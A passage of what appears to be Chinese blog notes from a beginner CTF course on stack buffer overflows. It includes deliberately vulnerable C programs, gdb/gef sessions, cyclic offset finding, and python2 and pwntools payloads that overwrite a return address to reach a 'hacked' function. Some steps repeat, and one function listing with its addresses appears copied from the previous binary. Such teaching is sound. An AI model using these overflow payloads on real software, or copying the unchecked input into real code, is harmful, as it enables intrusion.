class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--&gt; python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./overwrite&#x27;: pid 6112</span><br><span class="line">[+] Receiving all data: Done (25B)</span><br><span class="line">[*] Process &#x27;./overwrite&#x27; stopped with exit code 0 (pid 6112)</span><br><span class="line">yes? good job!!</span><br><span class="line">deadbeef</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">来自ai的解析：	</span><br><span class="line">	由于 gets() 不检查缓冲区的边界，如果输入的数据长度超过了 buffer 的大小（即32个字节），则会导致缓冲区溢出，进而可能覆盖 buffer 后面的内存空间中的数据。在这个例子中，key 变量正好位于 buffer 之后，因此可以通过精心构造的输入来覆盖 key 的值</span><br><span class="line">	恶意输入的数据布局：</span><br><span class="line">    由于 buffer 和 key 在栈中的相对位置是连续的，缓冲区溢出会让 32 个 A 字符填满 buffer，接下来的 0xdeadbeef 就会直接覆盖 key 的值</span><br></pre></td></tr></table></figure></div><hr><p><a class="link" target="_blank" rel="noopener" href="https://ba1ma0.blog.csdn.net/article/details/126788019?spm=1001.2014.3001.5502">PWN入门（4）覆盖程序函数的返回地址_pwn是什么意思-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><hr><h2 id="覆盖程序函数的返回地址（ret2win）"><a class="header-anchor" href="#覆盖程序函数的返回地址（ret2win）">¶</a>覆盖程序函数的返回地址（ret2win）</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This function is TOP SECRET! How did you get in here?! :O\n&quot;</span>);   <span class="comment">//成功破解的字符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_name</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">16</span>];    <span class="comment">//定义了一个变量，名为buffer，有16个字节的缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:\n&quot;</span>);   <span class="comment">//输出字符&quot;Name:</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);   <span class="comment">//获取我们输入的字符，并存入到buffer变量里</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi there, %s\n&quot;</span>, buffer);     <span class="comment">//输出字符Hi there和我们输入的变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    register_name();   <span class="comment">//调用上面的register_name自定义函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>目标：让程序调用<code>hacked自定义函数</code>里的内容</li></ul><h3 id="动态调试-v3"><a class="header-anchor" href="#动态调试-v3">¶</a>动态调试</h3><ul><li>gdb</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2win</span><br></pre></td></tr></table></figure></div><ul><li>查看程序里的函数</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info functions</span><br></pre></td></tr></table></figure></div><ul><li>查看主函数<code>register_name</code>的汇编代码</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble register_name</span><br></pre></td></tr></table></figure></div><ul><li>输入命令<code>cyclic</code>就能获得测试用的字符串</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ cyclic 100</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br></pre></td></tr></table></figure></div><blockquote><p>作用：生成100个字符串，每四个字符的最后一个字符都不一样，用于测试覆盖程序的返回地址需要多少个字符</p></blockquote><ul><li>输入<code>run</code>运行程序</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x6f      </span><br><span class="line">$ebx   : 0x61616166 (&quot;faaa&quot;?)</span><br><span class="line">$ecx   : 0x0       </span><br><span class="line">$edx   : 0x0       </span><br><span class="line">$esp   : 0xffffcb20  →  &quot;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]&quot;</span><br><span class="line">$ebp   : 0x61616167 (&quot;gaaa&quot;?)</span><br><span class="line">$esi   : 0x08049230  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0x61616168 (&quot;haaa&quot;?)</span><br><span class="line">$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line"></span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x61616168</span><br></pre></td></tr></table></figure></div><ul><li><p>显示：程序报错，里面原本的参数全被输入值覆盖</p></li><li><p>注意：<code>ret</code>指令</p><ul><li><code>ret</code>是子程序的返回指令，原本要返回<code>main</code>函数，结果被覆盖，返回到其他不存在的地址，于是程序报错</li></ul></li><li><p><code>EIP</code>：程序的指针</p><ul><li>指针寻找地址，指到什么地址，就会运行该地址的参数</li><li><strong><u>控制了这个指针，就能控制整个程序的运行</u></strong></li></ul></li><li><p><code>eip</code>寄存器里的值是<code>haaa</code>的十六进制，查一下<code>haaa</code>在生成字符串第几个</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--&gt; cyclic -l haaa</span><br><span class="line">28</span><br></pre></td></tr></table></figure></div><blockquote><p>说明要覆盖eip原本的返回地址并控制</p><p>就需要28个字符+想让程序跳转执行的地址</p></blockquote><ul><li>再次查看程序调用的函数地址</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x08049000  _init</span><br><span class="line">0x08049030  printf@plt</span><br><span class="line">0x08049040  puts@plt</span><br><span class="line">0x08049050  __libc_start_main@plt</span><br><span class="line">0x08049060  __isoc99_scanf@plt</span><br><span class="line">0x08049070  _start</span><br><span class="line">0x080490b0  _dl_relocate_static_pie</span><br><span class="line">0x080490c0  __x86.get_pc_thunk.bx</span><br><span class="line">0x080490d0  deregister_tm_clones</span><br><span class="line">0x08049110  register_tm_clones</span><br><span class="line">0x08049150  __do_global_dtors_aux</span><br><span class="line">0x08049180  frame_dummy</span><br><span class="line">0x08049182  hacked</span><br><span class="line">0x080491ad  register_name</span><br><span class="line">0x08049203  main</span><br><span class="line">0x0804921f  __x86.get_pc_thunk.ax</span><br><span class="line">0x08049230  __libc_csu_init</span><br><span class="line">0x08049290  __libc_csu_fini</span><br><span class="line">0x08049291  __x86.get_pc_thunk.bp</span><br><span class="line">0x08049298  _fini</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049182  hacked</span><br></pre></td></tr></table></figure></div><blockquote><p>hacked函数的地址为0x08049182</p></blockquote><h4 id="破解程序"><a class="header-anchor" href="#破解程序">¶</a>破解程序</h4><ul><li><p>用<code>python</code>生成字符</p></li><li><p>一个知识点：</p><ul><li>在<code>x86</code>架构里，读取地址是由低到高的</li><li>十六进制<code>0x08049182</code>就要从最后一个开始写</li></ul></li><li><p>将输出值放到一个文件里</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print &#x27;A&#x27;*28+&#x27;\x82\x91\x04\x08&#x27;&quot; &gt; exp</span><br></pre></td></tr></table></figure></div><ul><li>运行程序，导入这个文件里的值</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ret2win &lt; exp</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ python2 -c &quot;print &#x27;A&#x27;*28 + &#x27;\x82\x91\x04\x08&#x27;&quot; &gt; exp</span><br><span class="line">(pwn) ➜ ./ret2win &lt; exp</span><br><span class="line">This function is TOP SECRET! How did you get in here?! :O</span><br><span class="line">[1]    6907 segmentation fault (core dumped)  ./ret2win &lt; exp</span><br></pre></td></tr></table></figure></div><h4 id="gdb调试"><a class="header-anchor" href="#gdb调试">¶</a>gdb调试</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2win</span><br></pre></td></tr></table></figure></div><ul><li>在主函数<code>register_name</code>最后一条汇编指令的地址下一个断点，看程序里发生什么</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disassemble register_name</span><br><span class="line">b *0x08049202</span><br></pre></td></tr></table></figure></div><ul><li>导入存放字符的文件后直接运行</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run &lt; exp</span><br><span class="line"></span><br><span class="line">●→  0x8049202 &lt;register_name+0055&gt; ret    </span><br><span class="line">   ↳   0x8049182 &lt;hacked+0000&gt;    push   ebp</span><br><span class="line">       0x8049183 &lt;hacked+0001&gt;    mov    ebp, esp</span><br><span class="line">       0x8049185 &lt;hacked+0003&gt;    push   ebx</span><br><span class="line">       0x8049186 &lt;hacked+0004&gt;    sub    esp, 0x4</span><br><span class="line">       0x8049189 &lt;hacked+0007&gt;    call   0x804921f &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">       0x804918e &lt;hacked+000c&gt;    add    eax, 0x2e72</span><br></pre></td></tr></table></figure></div><ul><li>发现：<ul><li>程序原本的值是<code>main</code>函数的地址然后退出程序，现在被我覆盖成<code>hacked</code>函数的地址</li><li>于是程序就返回到<code>hacked</code>地址执行指令</li></ul></li></ul><h4 id="pwntools脚本-v2"><a class="header-anchor" href="#pwntools脚本-v2">¶</a>pwntools脚本</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   <span class="comment"># 导入pwntools模块</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win&#x27;</span>)    <span class="comment"># 运行程序</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">28</span> + p32(<span class="number">0x08049182</span>))   <span class="comment"># 程序运行后发送指定的字符串，格式为32位</span></span><br><span class="line"><span class="built_in">print</span>(io.recvall())   <span class="comment"># 接收输出</span></span><br></pre></td></tr></table></figure></div><ul><li>执行脚本</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./ret2win&#x27;: pid 7216</span><br><span class="line">[+] Receiving all data: Done (107B)</span><br><span class="line">[*] Process &#x27;./ret2win&#x27; stopped with exit code -11 (SIGSEGV) (pid 7216)</span><br><span class="line">b&#x27;Name:\nHi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x82\x91\x04\x08\nThis function is TOP SECRET! How did you get in here?! :O\n&#x27;</span><br></pre></td></tr></table></figure></div><hr><h2 id="32位程序与64位程序和构造ROP链"><a class="header-anchor" href="#32位程序与64位程序和构造ROP链">¶</a>32位程序与64位程序和构造ROP链</h2><p><a class="link" target="_blank" rel="noopener" href="https://ba1ma0.blog.csdn.net/article/details/126814308?spm=1001.2014.3001.5502">PWN入门（5）32位程序与64位程序和构造ROP链_ropper rop链构造-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><hr><h3 id="32位"><a class="header-anchor" href="#32位">¶</a>32位</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  checksec ret2win_params</span><br><span class="line">[*] &#x27;/home/xaut/Desktop/baimaoTutorial/crypto-cat-ctf/pwn/binary_exploitation_101/04-ret2win_with_params/32-bit/ret2win_params&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  ./ret2win_params       </span><br><span class="line">Name:</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[1]    7626 segmentation fault (core dumped)  ./ret2win_params</span><br></pre></td></tr></table></figure></div><blockquote><p>程序报错退出了，报错的信息是分段错误，可能造成了缓冲区溢出</p></blockquote><h4 id="源码分析"><a class="header-anchor" href="#源码分析">¶</a>源码分析</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">(<span class="type">int</span> first, <span class="type">int</span> second)</span>     <span class="comment">//自定义的hacked函数，我们需要让程序执行这个函数才算破解程序</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="number">0xdeadbeef</span> &amp;&amp; second == <span class="number">0xc0debabe</span>)&#123;    <span class="comment">//需要同时满足first = 0xdeadbeef和second = 0xc0debabe</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This function is TOP SECRET! How did you get in here?! :O\n&quot;</span>);   <span class="comment">//破解程序</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unauthorised access to secret function detected, authorities have been alerted!!\n&quot;</span>);   <span class="comment">//破解失败</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_name</span><span class="params">()</span>   <span class="comment">//自定义register_name函数，是程序主要执行的地方</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">16</span>];    <span class="comment">//定义了一个变量，名为buffer，有16个字节的缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:\n&quot;</span>);    <span class="comment">//输出字符&quot;Name:</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);   <span class="comment">//获取我们输入的字符，并存入到buffer变量里</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi there, %s\n&quot;</span>, buffer);     <span class="comment">//输出字符Hi there和我们输入的变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    register_name();   <span class="comment">//调用上面的register_name自定义函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h4 id="静态调试-v3"><a class="header-anchor" href="#静态调试-v3">¶</a>静态调试</h4><ul><li>ubuntu上用ghidra，巨难用，跳过了</li><li>之后做题就win拖拽文件到ida，不用虚拟机分析了</li></ul><h4 id="动态调试-v4"><a class="header-anchor" href="#动态调试-v4">¶</a>动态调试</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2win_params</span><br></pre></td></tr></table></figure></div><ul><li>查看程序里的函数</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info functions</span><br></pre></td></tr></table></figure></div><ul><li>输入命令cyclic获得测试用的字符串</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure></div><blockquote><p>生成200个字符串，每四个字符的最后一个字符都不一样</p><p>用于测试覆盖程序的返回地址需要多少个字符</p></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0xd3      </span><br><span class="line">$ebx   : 0x61616166 (&quot;faaa&quot;?)</span><br><span class="line">$ecx   : 0x0       </span><br><span class="line">$edx   : 0x0       </span><br><span class="line">$esp   : 0xffffcad0  →  &quot;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]&quot;</span><br><span class="line">$ebp   : 0x61616167 (&quot;gaaa&quot;?)</span><br><span class="line">$esi   : 0x08049250  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0x61616168 (&quot;haaa&quot;?)</span><br><span class="line">$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line"></span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x61616168</span><br></pre></td></tr></table></figure></div><ul><li><p>显示：程序报错，里面原本的参数全被输入值覆盖</p></li><li><p>注意：<code>ret</code>指令</p><ul><li><code>ret</code>是子程序的返回指令，原本要返回<code>main</code>函数，结果被覆盖，返回到其他不存在的地址，于是程序报错</li></ul></li><li><p><code>EIP</code>：程序的指针</p><ul><li>指针寻找地址，指到什么地址，就会运行该地址的参数</li><li><strong><u>控制了这个指针，就能控制整个程序的运行</u></strong></li></ul></li><li><p><code>eip</code>寄存器里的值是<code>haaa</code>的十六进制，查一下<code>haaa</code>在生成字符串第几个</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--&gt; cyclic -l haaa</span><br><span class="line">28</span><br></pre></td></tr></table></figure></div><blockquote><p>说明要覆盖eip原本</p></blockquote><ul><li><code>eip</code>寄存器里的值是<code>haaa</code>的十六进制，查一下<code>haaa</code>在生成字符串第几个</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--&gt; cyclic -l haaa</span><br><span class="line">28</span><br></pre></td></tr></table></figure></div><blockquote><p>说明要覆盖eip原本的返回地址并控制</p><p>就需要28个字符+想让程序跳转执行的地址</p></blockquote><ul><li>再次查看程序调用的函数地址</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x08049000  _init</span><br><span class="line">0x08049030  printf@plt</span><br><span class="line">0x08049040  puts@plt</span><br><span class="line">0x08049050  __libc_start_main@plt</span><br><span class="line">0x08049060  __isoc99_scanf@plt</span><br><span class="line">0x08049070  _start</span><br><span class="line">0x080490b0  _dl_relocate_static_pie</span><br><span class="line">0x080490c0  __x86.get_pc_thunk.bx</span><br><span class="line">0x080490d0  deregister_tm_clones</span><br><span class="line">0x08049110  register_tm_clones</span><br><span class="line">0x08049150  __do_global_dtors_aux</span><br><span class="line">0x08049180  frame_dummy</span><br><span class="line">0x08049182  hacked</span><br><span class="line">0x080491ad  register_name</span><br><span class="line">0x08049203  main</span><br><span class="line">0x0804921f  __x86.get_pc_thunk.ax</span><br><span class="line">0x08049230  __libc_csu_init</span><br><span class="line">0x08049290  __libc_csu_fini</span><br><span class="line">0x08049291  __x86.get_pc_thunk.bp</span><br><span class="line">0x08049298  _fini</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049182  hacked</span><br></pre></td></tr></table></figure></div><blockquote><p>hacked函数的地址为0x08049182</p><p>写一个脚本让程序跳转到这个地址</p></blockquote><ul><li>在<code>x86</code>架构里，读取地址是由低到高的，<code>十六进制0x08049182</code>就要从最后一个开始写，然后将输出的值存放到一个文件里</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print &#x27;A&#x27;*28+&#x27;\x82\x91\x04\x08&#x27;+&#x27;AAAA&#x27;+&#x27;BBBB&#x27;+&#x27;CCCC&#x27;+&#x27;DDDD&#x27;&quot; &gt; exp</span><br></pre></td></tr></table></figure></div><ul><li>在<code>register_name</code>函数的最后<code>ret</code>指令处下一个断点</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble register_name </span><br><span class="line">Dump of assembler code for function register_name:</span><br><span class="line">   0x080491d5 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x080491d6 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x080491d8 &lt;+3&gt;:	push   ebx</span><br><span class="line">   0x080491d9 &lt;+4&gt;:	sub    esp,0x14</span><br><span class="line">   0x080491dc &lt;+7&gt;:	call   0x80490c0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x080491e1 &lt;+12&gt;:	add    ebx,0x2e1f</span><br><span class="line">   0x080491e7 &lt;+18&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491ea &lt;+21&gt;:	lea    eax,[ebx-0x1f6b]</span><br><span class="line">   0x080491f0 &lt;+27&gt;:	push   eax</span><br><span class="line">   0x080491f1 &lt;+28&gt;:	call   0x8049040 &lt;puts@plt&gt;</span><br><span class="line">   0x080491f6 &lt;+33&gt;:	add    esp,0x10</span><br><span class="line">   0x080491f9 &lt;+36&gt;:	sub    esp,0x8</span><br><span class="line">   0x080491fc &lt;+39&gt;:	lea    eax,[ebp-0x18]</span><br><span class="line">   0x080491ff &lt;+42&gt;:	push   eax</span><br><span class="line">   0x08049200 